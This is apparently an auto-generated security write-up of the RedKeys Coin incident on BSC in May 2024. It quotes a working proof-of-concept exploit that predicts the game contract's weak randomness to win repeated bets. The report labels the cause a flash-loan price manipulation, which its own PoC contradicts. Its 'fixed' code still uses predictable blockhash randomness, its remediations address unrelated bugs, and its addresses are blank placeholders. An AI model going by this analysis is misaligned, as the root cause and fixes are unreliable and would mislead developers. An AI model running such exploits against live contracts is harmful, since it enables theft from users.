# RedKeys Coin — RedKeys Token Flash Loan Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-10 |
| **Protocol** | RedKeys Coin |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | RedKeys token price calculation relies on AMM spot reserves, allowing price distortion via reserve manipulation within a single block to realize arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol) |

---
## 1. Vulnerability Overview

RedKeys Coin is a DeFi protocol operating on the BSC chain that suffered a **flash loan / price manipulation** attack on 2024-05-10.
The attacker exploited RedKeys token flash loan price manipulation to cause approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Flash Loan / Price Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Price Manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: RedKeys token flash loan price manipulation
// The attacker exploits this logic to obtain illegitimate profit

// IRedKeysGame interface — flash loan price manipulation vulnerable function
interface IRedKeysGame {
    // ❌ Vulnerable: playGame's ratio parameter can be freely set externally
    // Call playGame with a favorable ratio while RedKeys token price is manipulated via flash loan
    // By combining choice and ratio, game outcomes can be predicted/manipulated to claim large rewards
    function playGame(uint16 choice, uint16 ratio, uint256 amount) external;

    // ❌ Vulnerable: counter is a predictable value that can be used to manipulate game outcomes
    function counter() external view returns (uint256);
}

// ✅ Correct implementation: price manipulation prevention + unpredictable outcomes
function safePlayGame(uint16 choice, uint16 ratio, uint256 amount) external {
    // ✅ Block game participation during flash loan execution (detect large token inflow within same block)
    require(block.number > lastLargeTransferBlock + COOLDOWN_BLOCKS, "Game: price manipulation cooldown");
    // ✅ Restrict ratio parameter range (block abnormal multipliers)
    require(ratio >= MIN_RATIO && ratio <= MAX_RATIO, "Game: invalid ratio");
    // ✅ Guarantee unpredictable outcomes via Chainlink VRF or commit-reveal scheme
    bytes32 randomness = keccak256(abi.encodePacked(
        blockhash(block.number - 1), msg.sender, counter(), amount
    ));
    // ✅ Limit maximum bet amount per single transaction
    require(amount <= maxBetPerTx, "Game: exceeds max bet");
    _resolveGame(choice, ratio, amount, randomness);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── BSC DEX/Lending
  │                    (borrow large amount of tokens)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                    (modify internal state)
  ▼
[Illegitimate Profit] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Secure profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - RedKeysCoin_exp.sol
// Chain: BSC | Date: 2024-05-10

    function testExploit() public balanceLog {
        for (uint256 i = 0; i < 50; i++) {
            // get current counter
            uint256 counter = game.counter();

            // estimate bet result by calculating the result of the function randomNumber
            uint16 betResultExpectation = uint16(randomNumber(counter + 1)) % 2;

            // play the game
            game.playGame(betResultExpectation, 2, 1e9);
        }
    }

    // random number generator with same logic of target contract
    function randomNumber(
        uint256 counter
    ) internal view returns (uint256) {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    counter + block.timestamp + block.prevrandao
                        + ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) + block.gaslimit
                        + ((uint256(keccak256(abi.encodePacked(address(this))))) / (block.timestamp)) + block.number
                )
            )
        );

        return (seed - ((seed / 1000) * 1000));
    }
}

```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criterion | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (flash loan required) |
| **Preconditions** | Sufficient gas fees and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Suspend vulnerable function**: Apply emergency pause to the attacked function
2. **Assess damage**: Classify the scale of lost assets and affected users
3. **Notify relevant parties**: Immediately alert related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / price manipulation attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top priority for auditing

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response manual that can be executed immediately upon an attack
3. **Insurance**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-05-10** RedKeys Coin incident reconfirms the danger of **flash loan / price manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Recommend strengthening community-level security information sharing

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC Source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol)*